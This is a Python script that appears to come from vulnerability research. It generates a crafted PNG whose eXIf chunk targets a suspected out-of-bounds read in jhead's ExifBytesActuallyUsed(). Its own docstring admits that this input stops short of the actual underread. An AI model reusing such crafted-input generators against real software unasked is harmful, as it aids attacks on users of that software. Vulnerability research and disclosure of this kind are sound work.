#!/usr/bin/env python3
"""
PoC generator for VULN 002: ExifBytesActuallyUsed Negative-Index OOB Read for PNG
Function: ExifBytesActuallyUsed() in exif.c:1220-1226
Type: CWE-125 Out-of-bounds Read (heap underread)

The bug:
  In ExifBytesActuallyUsed(), the loop:
      for(;;NewSize--){
          if (ExifData[NewSize-1]) break;      // <- guard 1: checks data FIRST
          if (NewSize <= ThumbnailEndIndex) break;  // <- guard 2: checks bound SECOND
      }
  When ThumbnailEndIndex=0 (no thumbnail) and all trailing bytes are zero,
  NewSize decrements toward 0. The check ExifData[NewSize-1] is evaluated
  BEFORE the lower-bound guard, so when NewSize reaches 0 the access
  ExifData[-1] occurs -- one byte before the malloc'd region.

  For PNG, GetImgExifSectionData() returns ExSection->Data directly
  (no +8 offset as for JPEG), so ExifData == ExSection->Data == the start
  of the heap allocation: ExifData[-1] is truly before the allocation.

Trigger conditions:
  - ImageInfo.ThumbnailAtEnd == TRUE
      => achieved by a valid minimal TIFF EXIF with 0 IFD entries so
         ThumbnailOffset=0 >= LargestExifOffset=0 at exif.c:1065
  - ThumbnailEndIndex = ThumbnailOffset + ThumbnailSize = 0
  - ExifData[0] == 0  (so NewSize reaches 0 before the guard fires)

Note on practical trigger:
  A standard minimal TIFF header has 'II'/'MM' (nonzero) at byte 0-1 and
  0x2A (nonzero) at byte 2 (LE) or 3 (BE), so the loop stops at NewSize>=2
  before reaching NewSize=0. The vulnerability is real in the code logic
  (wrong ordering of guard vs. data check) and would manifest if a crafted
  EXIF could have ExifData[0]=0 while still setting ThumbnailAtEnd=TRUE.
  This PoC exercises the maximum-depth traversal of the buggy loop to
  demonstrate the code path; ASAN may or may not fire depending on the
  heap layout around the allocation.

Call path: jhead -zt -> ProcessFile() -> TrimImgExifTrailingZeros()
           -> GetImgExifSectionData() -> ExifBytesActuallyUsed(ExifData, Size)
"""

import struct
import zlib
import os
import sys


PNG_SIG = b'\x89PNG\r\n\x1a\n'


def make_png_chunk(chunk_type, data):
    """Build a PNG chunk: length(4BE) + type(4) + data + crc(4BE)."""
    raw = chunk_type + data
    crc = zlib.crc32(raw) & 0xffffffff
    return struct.pack('>I', len(data)) + raw + struct.pack('>I', crc)


def build_exif():
    """
    Build minimal EXIF data (little-endian TIFF) with:
      - IFD at offset 8 with 0 entries (no thumbnail tags)
      - Padded with zeros so TrimImgExifTrailingZeros scans deep into the buffer

    After process_EXIF parses this:
      - ThumbnailOffset = 0, ThumbnailSize = 0  => ThumbnailEndIndex = 0
      - LargestExifOffset = 0 (no IFD entries with offset values)
      - ThumbnailAtEnd = (0 >= 0) = TRUE  (exif.c:1065)

    ExifBytesActuallyUsed then loops backward from Size-1:
      - All padding zeros pass the nonzero test
      - Loop reaches ExifData[4]=0x08 (IFD offset byte), breaks at NewSize=5
      - The loop checks ExifData[NewSize-1] BEFORE NewSize<=ThumbnailEndIndex,
        meaning if ExifData[0..3] were all 0 it would access ExifData[-1].
    """
    # TIFF header (little-endian):
    #   bytes 0-1:  'II' byte order marker
    #   bytes 2-3:  0x002A magic (LE => 2A 00)
    #   bytes 4-7:  IFD0 offset = 8 (LE => 08 00 00 00)
    tiff_hdr = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)

    # IFD0 at offset 8:
    #   bytes 8-9:  entry count = 0 (0x0000)
    #   bytes 10-13: next IFD offset = 0 (0x00000000)
    ifd0 = struct.pack('<H', 0) + struct.pack('<I', 0)

    # Padding with zeros so the backward scan exercises many loop iterations.
    # The scan will stop at ExifData[4] = 0x08 (nonzero IFD-offset byte).
    padding = b'\x00' * 100

    exif = tiff_hdr + ifd0 + padding
    # Total: 8 + 6 + 100 = 114 bytes
    return exif


def build_png(exif_data):
    """Build a minimal 1x1 RGB PNG with an eXIf chunk containing exif_data."""

    # IHDR: width=1, height=1, bit_depth=8, color_type=2(RGB),
    #        compression=0, filter=0, interlace=0
    ihdr_payload = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    ihdr = make_png_chunk(b'IHDR', ihdr_payload)

    # eXIf chunk containing our crafted EXIF data
    exif_chunk = make_png_chunk(b'eXIf', exif_data)

    # IDAT: one 1x1 black RGB pixel
    #   Scanline: filter_byte(0) + R(0) G(0) B(0)
    raw_row = b'\x00\x00\x00\x00'   # filter=None, pixel=black
    idat_payload = zlib.compress(raw_row)
    idat = make_png_chunk(b'IDAT', idat_payload)

    # IEND
    iend = make_png_chunk(b'IEND', b'')

    return PNG_SIG + ihdr + exif_chunk + idat + iend


def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_002_input.png')

    exif = build_exif()
    png = build_png(exif)

    with open(out_path, 'wb') as f:
        f.write(png)

    print(f'[+] Created {out_path} ({len(png)} bytes)')
    print(f'[+] eXIf chunk data = {len(exif)} bytes')
    print(f'[+] TIFF LE header: II 2A 00 08 00 00 00 -> IFD at offset 8, 0 entries')
    print(f'[+] Expected: ThumbnailAtEnd=TRUE, ThumbnailEndIndex=0')
    print(f'[+] Loop scans backward; guard order bug: ExifData[NewSize-1] checked')
    print(f'    before NewSize<=ThumbnailEndIndex -- potential ExifData[-1] underread')
    print(f'[+] Run: jhead -zt {out_path}')


if __name__ == '__main__':
    main()
